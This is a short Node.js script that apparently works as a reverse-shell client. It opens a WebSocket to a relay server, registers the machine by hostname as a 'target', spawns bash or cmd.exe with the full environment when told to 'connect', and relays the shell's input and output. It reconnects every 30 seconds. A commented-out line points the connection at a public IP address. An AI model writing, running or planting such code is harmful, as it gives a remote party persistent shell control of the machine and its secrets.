/*
 * @Description: 
 * @Version: 1.0
 * @Autor: solid
 * @Date: 2022-10-31 14:06:37
 * @LastEditors: solid
 * @LastEditTime: 2022-11-01 16:07:05
 */
const WebSocket = require('ws');
const pty = require('node-pty');
const os = require('os');
const shell = os.platform() === 'win32' ? 'cmd.exe' : 'bash';

var reconnectInterval = 1000 * 30;
var ws;
var timer
var room = os.hostname();
var connect = function () {
    let ptyProcess;
    let flag = false
    // ws = new WebSocket("ws://101.34.204.112:7880/ws?room="+room+"_target");
    ws = new WebSocket("ws://127.0.0.1:7880/ws?room=" + room + "_target");
    ws.on('open', function () {
        clearInterval(timer)
        console.log("连接成功");

    });
    ws.on("message", (message) => {
        if (message && message.toString() == "exit") {
            console.log('客户端退出');
            ptyProcess = null
            flag = false
        } else if (message && message.toString() == 'connect') {
            console.log('客户端进行连接');
            ptyProcess = pty.spawn(shell, [], {
                name: 'xterm-color',
                cols: 80,
                rows: 30,
                cwd: process.env.HOME,
                env: process.env
            });
            ptyProcess.on('data', function (data) {
                ws.send(data)
            });
            flag = true
            return
        }
        if (flag) {
            ptyProcess.write(message)
        }
    })
    ws.on('error', function () {
        console.log('socket error');
    });
    ws.on('close', function () {
        console.log('连接断开');
        console.log("等待重连");
        timer = setInterval(connect, reconnectInterval)
    });
};
connect();